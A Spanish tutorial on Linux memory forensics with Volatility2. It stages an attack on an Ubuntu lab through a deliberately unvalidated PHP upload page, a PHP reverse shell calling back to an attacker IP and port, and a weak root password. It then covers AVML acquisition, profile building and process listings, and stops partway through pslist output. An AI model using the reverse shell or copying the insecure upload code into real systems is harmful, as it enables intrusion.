---
icon: redhat
---

# Herramienta Volatility2 (Linux)

Vamos a ver `Análisis Forense` en sistemas `linux` la unica diferencia de los sistemas `Windows` es que el `kernel` es muy diferente entre si, por lo que la herramienta `Volatility` no va a detectar el `profile` de forma automatica como lo hace en `Windows` ya que siempre tendra la misma arquitectura, pero en `linux` siempre esta evolucionando y cambiando, por lo que tendremos que crearlo nosotros de forma manual, lo vamos a ver mas adelante.

Como laboratorio vamos a tener `2` `Kali Linux` uno sera el atacante, el otro sera el de `Análisis Forense` (En este caso utilizaremos el mismo `Kali` para las dos funciones, pero realmente tendrian que estar separadas en un caso real) y `1` maquina ubuntu `16.04` que sera la victima.

## Montaje/ejecución del LAB

En el `Ubuntu 16.04` vamos a instalar `apache2` para que este activa una pagina web.

```shell
sudo apt install apache2
```

Iniciaremos el servicio:

```shell
sudo service apache2 start
```

Ahora vamos a simular una vulnerabilidad en la que puedas subir archivos en la pagina por ejemplo un `PHP` y desde la maquina atacante puedas obtener una `reverse shell` gracias al archivo que subiste ya que lo ejecuta `www-data` por lo que entrariamos como dicho usuario.

Despues escalaremos a `root` metiendo la contraseña del mismo como si hubieramos descubierto que tenia una contraseña debil.

> index.php

```php
<?php
// Ruta donde se guardarán los archivos subidos
$upload_dir = __DIR__ . '/uploads/';

// Crea la carpeta uploads si no existe
if (!is_dir($upload_dir)) {
    mkdir($upload_dir, 0755, true);
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $file = $_FILES['file'];

    // Nombre del archivo
    $filename = basename($file['name']);
    $target_file = $upload_dir . $filename;

    // Mueve el archivo subido sin ninguna validación
    if (move_uploaded_file($file['tmp_name'], $target_file)) {
        echo "Archivo subido correctamente: <a href='uploads/$filename'>$filename</a>";
    } else {
        echo "Error al subir el archivo.";
    }
}
?>

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Subida de Archivos</title>
</head>
<body>
    <h1>Subir un archivo</h1>
    <form method="POST" enctype="multipart/form-data">
        <input type="file" name="file" required>
        <button type="submit">Subir</button>
    </form>
</body>
</html>
```

Este archivo lo alojamos en la siguiente ruta:

```
nano /var/www/html/index.php
```

Pegamos todo lo anterior y lo guardamos con `Ctrl+X, Y y ENTER`, despues instalamos todo lo necesario para que interprete `PHP`.

```shell
sudo apt install apache2 php libapache2-mod-php -y
sudo a2enmod php*
sudo mkdir -p /var/www/html/uploads
sudo chmod 777 /var/www/html/uploads
sudo service apache2 start
```

Echo esto lo tendriamos todo listo, ahora nos conectaremos desd el `kali` a la maquina victima desde el navegador.

```
URL = http://<IP_VICTIM>/
```

Veremos la pagina web y vamos a crear el siguiente archivo.

> shell.php

```php
<?php
$sock=fsockopen("<IP>",<PORT>);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
```

Una vez creado esto en la maquina atacante, vamos a ponernos a la escucha:

```shell
nc -lvnp <PORT>
```

Ahora en la pagina web, subiremos dicho archivo, una vez subido, tendremos que ir a ver el archivo para que se ejecute.

```
URL = http://<IP_VICTIM>/uploads/shell.php
```

Ahora si volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.177.129] from (UNKNOWN) [192.168.177.132] 34146
whoami
www-data
```

Vemos que ha funcionado, por lo que sanitizaremos la `shell`.

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

Ahora antes de hace nada, nos volveremos a nuestro `ubuntu` y le cambiaremos la password a `root` haciendo esto.

```shell
sudo passwd root
```

Metemos como contraseña `root` simplemente eso, echo esto vamos a donde tenemos nuestra `shell` del atacante y haremos lo siguiente:

```shell
su root
```

Metemos como contraseña `root` y ya seremos dicho usuario.

```
root@ubuntu:~# whoami
root
```

Por lo que esta primera parte ya esta echa.

## Creación de dump de imagen para Análisis Forense

Imaginaremos que nos damos cuenta de que alguien se ha metido en nuestro servidor (`Hacker`) para poder analizar todo esto con la tecnica ya mencionada vamos a crear lo siguiente.

> NOTA

Esto en un caso real generalmente el profesional tiene que ir de forma presencial, ya que si el atacante siguiera dentro y yo me conectara mediante una `VPN` a dicho servidor, tambien nos podria infectar a nosotros, por lo que hay que tener mucho cuidado en casos reales.

El primer paso para realizar la adquisición de la memoria `RAM` es utilizando la herramienta `avlm` que esta subido en `GitHub`.

URL = [GitHub Tool AVML](https://github.com/microsoft/avml)

Esto lo que nos permite hacer es un `dump` de memoria `RAM`, ya para otros casos se realizaria un analisis de disco.

Ahora en una `red` aislada nos descargaremos la herramienta de esta forma en la maquina `ubuntu`.

```shell
wget https://github.com/microsoft/avml/releases/download/v0.11.4/avml
```

Esto nos descargara la herramienta que en mi caso utilizo la `v0.11.4` de `AVML`.

Ahora para realizar este `dump` de memoria seria de esta forma:

```shell
sudo chmod +x avml
sudo ./avml memory.raw
```

Una vez que haya terminado veremos el archivo `memory.raw`, ahora abriremos un servidor de `python3` y desde la maquina de `análisis forense` nos descargaremos dicho archivo con `wget`.

```shell
python3 -m http.server 80
```

Ahora desde la maquina `forense` haremos esto.

```shell
wget http://<IP_VICTIM>/memory.raw
```

Una vez que nos lo hayamos pasado, ya podremos analizarlo tranquilamente en nuestra maquina.

## Análisis Forense del memory.raw

Una vez que ya nos lo hayamos pasado todo, siempre super importante lo primero es comprobar el `hash MD5` para ver que se haya pasado todo de forma correcta, esto se puede hacer de esta forma:

> Maquina victima

```shell
md5sum memory.raw
```

Info:

```
e7c272379c3fc370d82977f7719e0706  memory.raw
```

> Maquina Forense

```shell
md5sum memory.raw
```

Info:

```
e7c272379c3fc370d82977f7719e0706  memory.raw
```

Por lo que vemos coincide, por lo que se paso de forma correcta y es el archivo original.

Ahora tendremos que crear un `profile` determiando para que todo esto funcione.

### Creación de profile para el dump

En la maquina victima de `ubuntu` tendremos que instalar esto:

```shell
sudo apt update && sudo apt install -y linux-image-$(uname -r) linux-headers-$(uname -r) build-essential dwarfdump make zip git
```

Ahora vamos a descargarnos `volatility` y realizar el `make` del mismo.

```shell
git clone https://github.com/volatilityfoundation/volatility.git
cd volatility/tools/linux
make
```

Info:

```
make -C //lib/modules/4.4.0-186-generic/build CONFIG_DEBUG_INFO=y M="/root/volatility/tools/linux" modules
make[1]: Entering directory '/usr/src/linux-headers-4.4.0-186-generic'
  CC [M]  /root/volatility/tools/linux/module.o
  Building modules, stage 2.
  MODPOST 1 modules
  CC      /root/volatility/tools/linux/module.mod.o
  LD [M]  /root/volatility/tools/linux/module.ko
make[1]: Leaving directory '/usr/src/linux-headers-4.4.0-186-generic'
dwarfdump -di module.ko > module.dwarf
make -C //lib/modules/4.4.0-186-generic/build M="/root/volatility/tools/linux" clean
make[1]: Entering directory '/usr/src/linux-headers-4.4.0-186-generic'
  CLEAN   /root/volatility/tools/linux/.tmp_versions
  CLEAN   /root/volatility/tools/linux/Module.symvers
make[1]: Leaving directory '/usr/src/linux-headers-4.4.0-186-generic'
```

Con esto veremos que ha funcionado, por lo que se nos ha tenido que crear un archivo llamado `module.dwarf`.

```shell
cd ../../../
zip $(lsb_release -i -s)_$(uname -r)_profile.zip ./volatility/tools/linux/module.dwarf /boot/System.map-$(uname -r)
```

Con esto ya lo tendremos echo y en un `.zip` todo, esto nos lo tendremos que pasar a la maquina `forense` de la misma forma que hicimos con el `.war`, por lo que cuando nos lo hayamos pasado, tendremos que hacer lo siguiente.

Tendremos que mover el `ZIP` a una carpeta en concreto de `volatility`, cuando nos descargamos el repositorio del mismo, entramos dentro y dentro tendremos que ejecutar los siguientes comandos.

#### Volatility2

```shell
mv Ubuntu_4.4.0-186-generic_profile.zip volatility/plugins/overlays/linux/
```

#### Volatility3

Para esta `v3` habria que realizar un `vmlinux del kernel` para que lo detecte de forma automatica, en este caso no sirve un `ZIP` sin mas, pero vamos a verlo con la `v2` simplemente y para otros apuntes utilizare la `v3`.

Una vez echo esto ya tendremos el `profile` totalmente configurado para utilizar el `dump` de forma correcta.

### Obtener información del banner

Para comprobar que funciona de forma correcta, vamos a obtener informacion del sistema por el `banner` de esta forma.

```shell
./vol.py -f memory.raw --profile=LinuxUbuntu_4_4_0-186-generic_profilex64 linux_banner
```

Info:

```
Volatility Foundation Volatility Framework 2.6.1
Linux version 4.4.0-186-generic (buildd@lcy01-amd64-002) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.12) ) #216-Ubuntu SMP Wed Jul 1 05:34:05 UTC 2020 (Ubuntu 4.4.0-186.216-generic 4.4.228)
```

Vemos que esta funcionando de forma correcta.

### Obtener información de los procesos del dump

Con el parametro `linux_pstree` vamos a obtener en forma de árbol los procesos que estaban en ese momento en el sistema, viendo los procesos padres, hijos, subprocesos, etc...

```shell
./vol.py -f memory.raw --profile=LinuxUbuntu_4_4_0-186-generic_profilex64 linux_pstree
```

Info:

```
Volatility Foundation Volatility Framework 2.6.1
Name                 Pid             Uid            
systemd              1                              
.systemd-journal     350                            
.systemd-udevd       396                            
.systemd-timesyn     471             100            
.rsyslogd            627             104            
.cron                632                            
.dbus-daemon         634             106            
.systemd-logind      667                            
.accounts-daemon     670                            
.irqbalance          695                            
.dhclient            752                            
.vmtoolsd            1431                           
.VGAuthService       1453                           
.vmware-vmblock-     3290                           
.login               3357                           
..bash               3390            1000           
...sudo              3441                           
....su               3442                           
.....bash            3443                           
.systemd             3384            1000           
..(sd-pam)           3386            1000           
.sshd                5635                           
..sshd               12279                          
...sshd              12305           1000           
....bash             12306           1000           
.....sudo            12329                          
......avml           12330                          
.apache2             12155                          
..apache2            12158           33             
..apache2            12159           33             
..apache2            12160           33             
...sh                12223           33             
....sh               12224           33             
.....script          12226           33             
......sh             12227           33             
.......bash          12228           33             
........su           12243           33             
.........bash        12252                          
..apache2            12161           33             
..apache2            12162           33             
..apache2            12166           33             
.systemd             12244                          
..(sd-pam)           12247                          
[kthreadd]           2                              
.[ksoftirqd/0]       3                              
.[kworker/0:0H]      5                              
.[rcu_sched]         7                              
.[rcu_bh]            8                              
.[migration/0]       9                              
.[watchdog/0]        10                             
.[watchdog/1]        11                             
.[migration/1]       12                             
.[ksoftirqd/1]       13                             
.[kworker/1:0]       14                             
.[kworker/1:0H]      15                             
.[kdevtmpfs]         16                             
.[netns]             17                             
.[perf]              18                             
.[khungtaskd]        19                             
.[writeback]         20                             
.[ksmd]              21                             
.[khugepaged]        22                             
.[crypto]            23                             
.[kintegrityd]       24                             
.[bioset]            25                             
.[kblockd]           26                             
.[ata_sff]           27                             
.[md]                28                             
.[devfreq_wq]        29                             
.[kswapd0]           33                             
.[vmstat]            34                             
.[fsnotify_mark]     35                             
.[ecryptfs-kthrea]   36                             
.[kthrotld]          52                             
.[acpi_thermal_pm]   53                             
.[bioset]            55                             
.[bioset]            56                             
.[bioset]            57                             
.[bioset]            58                             
.[bioset]            59                             
.[bioset]            60                             
.[bioset]            61                             
.[bioset]            62                             
.[scsi_eh_0]         63                             
.[scsi_tmf_0]        64                             
.[scsi_eh_1]         65                             
.[scsi_tmf_1]        66                             
.[ipv6_addrconf]     72                             
.[deferwq]           85                             
.[charger_manager]   86                             
.[bioset]            137                            
.[bioset]            138                            
.[bioset]            139                            
.[bioset]            140                            
.[bioset]            141                            
.[bioset]            142                            
.[bioset]            143                            
.[bioset]            144                            
.[mpt_poll_0]        157                            
.[mpt/0]             158                            
.[kpsmoused]         159                            
.[scsi_eh_2]         160                            
.[scsi_tmf_2]        161                            
.[scsi_eh_3]         162                            
.[scsi_tmf_3]        163                            
.[scsi_eh_4]         164                            
.[scsi_tmf_4]        165                            
.[scsi_eh_5]         166                            
.[scsi_tmf_5]        167                            
.[scsi_eh_6]         168                            
.[scsi_tmf_6]        169                            
.[scsi_eh_7]         170                            
.[scsi_tmf_7]        171                            
.[scsi_eh_8]         172                            
.[scsi_tmf_8]        173                            
.[scsi_eh_9]         174                            
.[scsi_tmf_9]        175                            
.[scsi_eh_10]        176                            
.[scsi_tmf_10]       177                            
.[scsi_eh_11]        178                            
.[scsi_tmf_11]       179                            
.[scsi_eh_12]        180                            
.[scsi_tmf_12]       181                            
.[scsi_eh_13]        182                            
.[scsi_tmf_13]       183                            
.[scsi_eh_14]        184                            
.[scsi_tmf_14]       185                            
.[scsi_eh_15]        186                            
.[scsi_tmf_15]       187                            
.[scsi_eh_16]        188                            
.[scsi_tmf_16]       189                            
.[scsi_eh_17]        190                            
.[scsi_tmf_17]       191                            
.[scsi_eh_18]        192                            
.[scsi_tmf_18]       193                            
.[scsi_eh_19]        194                            
.[scsi_tmf_19]       195                            
.[scsi_eh_20]        196                            
.[scsi_tmf_20]       197                            
.[scsi_eh_21]        198                            
.[scsi_tmf_21]       199                            
.[scsi_eh_22]        200                            
.[scsi_tmf_22]       201                            
.[scsi_eh_23]        202                            
.[scsi_tmf_23]       203                            
.[scsi_eh_24]        204                            
.[scsi_tmf_24]       205                            
.[scsi_eh_25]        206                            
.[scsi_tmf_25]       207                            
.[scsi_eh_26]        208                            
.[scsi_tmf_26]       209                            
.[scsi_eh_27]        210                            
.[scsi_tmf_27]       211                            
.[scsi_eh_28]        212                            
.[scsi_tmf_28]       213                            
.[scsi_eh_29]        214                            
.[scsi_tmf_29]       215                            
.[scsi_eh_30]        216                            
.[scsi_tmf_30]       217                            
.[scsi_eh_31]        218                            
.[scsi_tmf_31]       219                            
.[scsi_eh_32]        247                            
.[scsi_tmf_32]       248                            
.[bioset]            249                            
.[ttm_swap]          250                            
.[bioset]            268                            
.[bioset]            269                            
.[kworker/0:1H]      273                            
.[jbd2/sda1-8]       297                            
.[ext4-rsv-conver]   298                            
.[kworker/1:1H]      335                            
.[kauditd]           356                            
.[kworker/u256:2]    3437                           
.[kworker/0:1]       5643                           
.[kworker/1:1]       12139                          
.[kworker/u256:1]    12236                          
.[kworker/0:3]       12242                          
.[kworker/u256:0]    12318
```

Vemos que ha funcionado, pero hay muchisima informacion, por lo que vamos a utilizar otros parametros para sacar mas informacion.

Tambien tenemos el `pslist` para verlo todo con mas detalle.

```shell
 ./vol.py -f memory.raw --profile=LinuxUbuntu_4_4_0-186-generic_profilex64 linux_pslist
```

Info:

```
Offset             Name                 Pid             PPid            Uid             Gid    DTB                Start Time
------------------ -------------------- --------------- --------------- --------------- ------ ------------------ ----------
0xffff880138790000 systemd              1               0               0               0      0x00000000b6728000 2025-07-14 08:43:09 UTC+0000
0xffff880138790e40 kthreadd             2               0               0               0      ------------------ 2025-07-14 08:43:09 UTC+0000
0xffff880138791c80 ksoftirqd/0          3               2               0               0      ------------------ 2025-07-14 08:43:09 UTC+0000
0xffff880138793900 kworker/0:0H         5               2               0               0      ------------------ 2025-07-14 08:43:09 UTC+0000
0xffff880138795580 rcu_sched            7               2               0               0      ------------------ 2025-07-14 08:43:09 UTC+0000
0xffff8801387963c0 rcu_bh               8               2               0               0      ------------------ 2025-07-14 08:43:09 UTC+0000
0xffff880138000000 migration/0          9               2               0               0      ------------------ 2025-07-14 08:43:09 UTC+0000
0xffff880138000e40 watchdog/0           10              2               0               0      ------------------ 2025-07-14 08:43:09 UTC+0000
0xffff8801382f8e40 watchdog/1           11              2               0               0      ------------------ 2025-07-14 08:43:09 UTC+0000
0xffff8801382f9c80 migration/1          12              2               0               0      ------------------ 2025-07-14 08:43:09 UTC+0000
0xffff8801382faac0 ksoftirqd/1          13              2               0               0      ------------------ 2025-07-14 08:43:09 UTC+0000
0xffff8801382fb900 kworker/1:0          14              2               0               0      ------------------ 2025-07-14 08:43:09 UTC+0000
0xffff8801382fc740 kworker/1:0H         15              2               0               0      ------------------ 2025-07-14 08:43:09 UTC+0000
0xffff8801382fd580 kdevtmpfs            16              2               0               0      ------------------ 2025-07-14 08:43:09 UTC+0000
0xffff8801382fe3c0 netns                17              2               0               0      ------------------ 2025-07-14 08:43:09 UTC+0000
0xffff880137dc0000 perf                 18              2               0               0      ------------------ 2025-07-14 08:43:09 UTC+0000
0xffff880137dc0e40 khungtaskd           19              2               0               0      ------------------ 2025-07-14 08:43:09 UTC+0000
0xffff880137dc1c80 writeback            20              2               0               0      ------------------ 2025-07-14 08:43:09 UTC+0000
0xffff880137dc2ac0 ksmd                 21              2               0               0      ------------------ 2025-07-14 08:43:09 UTC+0000
0xffff880137dc3900 khugepaged           22              2               0               0      ------------------ 2025-07-14 08:43:09 UTC+0000
0xffff880137dc4740 crypto               23              2               0               0      ------------------ 2025-07-14 08:43:09 UTC+0000
0xffff880137dc5580 kintegrityd          24              2               0               0      ------------------ 2025-07-14 08:43:09 UTC+0000
0xffff880137dc63c0 bioset               25              2               0               0      ------------------ 2025-07-14 08:43:09 UTC+0000
0xffff880137e58000 kblockd              26              2               0               0      ------------------ 2025-07-14 08:43:09 UTC+0000
0xffff880137e58e40 ata_sff              27              2               0               0      ------------------ 2025-07-14 08:43:09 UTC+0000
0xffff880137e59c80 md                   28              2               0               0      ------------------ 2025-07-14 08:43:09 UTC+0000
0xffff880137e5aac0 devfreq_wq           29              2               0               0      ------------------ 2025-07-14 08:43:09 UTC+0000
0xffff880137e5e3c0 kswapd0              33              2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff8800b6518000 vmstat               34              2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff8800b6518e40 fsnotify_mark        35              2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff8800b6519c80 ecryptfs-kthrea      36              2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff8800b65d9c80 kthrotld             52              2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff8800b65daac0 acpi_thermal_pm      53              2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff8800b65b5580 bioset               55              2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff8800b65b4740 bioset               56              2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff8800b65b3900 bioset               57              2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff8800b65b2ac0 bioset               58              2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff8800b65b1c80 bioset               59              2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff8800b65b0e40 bioset               60              2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff8800b65b0000 bioset               61              2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff8800b651e3c0 bioset               62              2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff8800b651d580 scsi_eh_0            63              2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff8800b651c740 scsi_tmf_0           64              2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff8800b651b900 scsi_eh_1            65              2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff8800b651aac0 scsi_tmf_1           66              2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff880135c5b900 ipv6_addrconf        72              2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff8800b6768e40 deferwq              85              2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff8800b6769c80 charger_manager      86              2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff880135c5e3c0 bioset               137             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff880135c5aac0 bioset               138             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff880135c59c80 bioset               139             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff880135c58e40 bioset               140             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff880135c5d580 bioset               141             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff880135c5c740 bioset               142             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff8800348d0000 bioset               143             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff8800348d0e40 bioset               144             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff8800348d1c80 mpt_poll_0           157             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff8800348d2ac0 mpt/0                158             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff8800348d3900 kpsmoused            159             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff8800348d4740 scsi_eh_2            160             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff8800348d5580 scsi_tmf_2           161             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff8800348d63c0 scsi_eh_3            162             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff8800356d0000 scsi_tmf_3           163             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff8800356d0e40 scsi_eh_4            164             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff8800356d1c80 scsi_tmf_4           165             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff8800356d2ac0 scsi_eh_5            166             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff8800356d3900 scsi_tmf_5           167             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff8800356d4740 scsi_eh_6            168             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff8800356d5580 scsi_tmf_6           169             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff8800356d63c0 scsi_eh_7            170             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff880034440000 scsi_tmf_7           171             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff880034440e40 scsi_eh_8            172             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff880034441c80 scsi_tmf_8           173             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff880034442ac0 scsi_eh_9            174             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff880034443900 scsi_tmf_9           175             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff880034444740 scsi_eh_10           176             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff880034445580 scsi_tmf_10          177             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff8800344463c0 scsi_eh_11           178             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff880034488000 scsi_tmf_11          179             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff880034488e40 scsi_eh_12           180             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff880034489c80 scsi_tmf_12          181             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff88003448aac0 scsi_eh_13           182             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff88003448b900 scsi_tmf_13          183             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff88003448c740 scsi_eh_14           184             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff88003448d580 scsi_tmf_14          185             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff88003448e3c0 scsi_eh_15           186             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff8800344b8000 scsi_tmf_15          187             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff8800344b8e40 scsi_eh_16           188             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff8800344b9c80 scsi_tmf_16          189             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff8800344baac0 scsi_eh_17           190             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff8800344bb900 scsi_tmf_17          191             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff8800344bc740 scsi_eh_18           192             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff8800344bd580 scsi_tmf_18          193             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff8800344be3c0 scsi_eh_19           194             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff8800344f0000 scsi_tmf_19          195             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff8800344f0e40 scsi_eh_20           196             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff8800344f1c80 scsi_tmf_20          197             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff8800344f2ac0 scsi_eh_21           198             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff8800344f3900 scsi_tmf_21          199             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff8800344f4740 scsi_eh_22           200             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff8800344f5580 scsi_tmf_22          201             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff8800344f63c0 scsi_eh_23           202             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff880034520000 scsi_tmf_23          203             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff880034520e40 scsi_eh_24           204             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff880034521c80 scsi_tmf_24          205             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff880034522ac0 scsi_eh_25           206             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff880034523900 scsi_tmf_25          207             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff880034524740 scsi_eh_26           208             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff880034525580 scsi_tmf_26          209             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff8800345263c0 scsi_eh_27           210             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff880034568000 scsi_tmf_27          211             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff880034568e40 scsi_eh_28           212             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff880034569c80 scsi_tmf_28          213             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff88003456aac0 scsi_eh_29           214             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff88003456b900 scsi_tmf_29          215             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff88003456c740 scsi_eh_30           216             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff88003456d580 scsi_tmf_30          217             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff88003456e3c0 scsi_eh_31           218             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff880034598000 scsi_tmf_31          219             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff880034598e40 scsi_eh_32           247             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff880034599c80 scsi_tmf_32          248             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff88003459aac0 bioset               249             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff88003459b900 ttm_swap             250             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff88003459c740 bioset               268             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff88003459d580 bioset               269             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff880034398e40 kworker/0:1H         273             2               0               0      ------------------ 2025-07-14 08:43:10 UTC+0000
0xffff880034368000 jbd2/sda1-8          297             2               0               0      ------------------ 2025-07-14 08:43:11 UTC+0000
0xffff88003459e3c0 ext4-rsv-conver      298             2               0               0      ------------------ 2025-07-14 08:43:11 UTC+0000
0xffff8800b67ad580 kworker/1:1H         335             2               0               0      ------------------ 2025-07-14 08:43:11 UTC+0000
0xffff8800b67e2ac0 systemd-journal      350             1               0               0      0x0000000035504000 2025-07-14 08:43:11 UTC+0000
0xffff8800b67e0e40 kauditd              356             2               0               0      ------------------ 2025-07-14 08:43:11 UTC+0000
0xffff88003439e3c0 systemd-udevd        396             1               0               0      0x0000000035448000 2025-07-14 08:43:11 UTC+0000
0xffff8800b67e5580 systemd-timesyn      471             1               100             102    0x0000000138372000 2025-07-14 08:43:11 UTC+0000
0xffff8800ba111c80 rsyslogd             627             1               104             108    0x00000000ba12c000 2025-07-14 08:43:11 UTC+0000
0xffff8800ba1163c0 cron                 632             1               0               0      0x0000000137a80000 2025-07-14 08:43:11 UTC+0000
0xffff8800ba148e40 dbus-daemon          634             1               106             110    0x00000000b8ba8000 2025-07-14 08:43:11 UTC+0000
0xffff8800ba14e3c0 systemd-logind       667             1               0               0      0x0000000135db8000 2025-07-14 08:43:12 UTC+0000
0xffff8800ba149c80 accounts-daemon      670             1               0               0      0x000000013563c000 2025-07-14 08:43:12 UTC+0000
0xffff88003436c740 irqbalance           695             1               0               0      0x00000000b5872000 2025-07-14 08:43:12 UTC+0000
0xffff8800b6990000 dhclient             752             1               0               0      0x00000001355a2000 2025-07-14 08:43:13 UTC+0000
0xffff8800b67aaac0 vmtoolsd             1431            1               0               0      0x0000000135c7c000 2025-07-14 08:43:19 UTC+0000
0xffff8800b8b02ac0 VGAuthService        1453            1               0               0      0x00000000b7aca000 2025-07-14 08:43:19 UTC+0000
0xffff8800b5dad580 vmware-vmblock-      3290            1               0               0      0x00000000b69f6000 2025-07-14 08:43:41 UTC+0000
0xffff8800ba14d580 login                3357            1               0               1000   0x0000000034902000 2025-07-14 08:43:42 UTC+0000
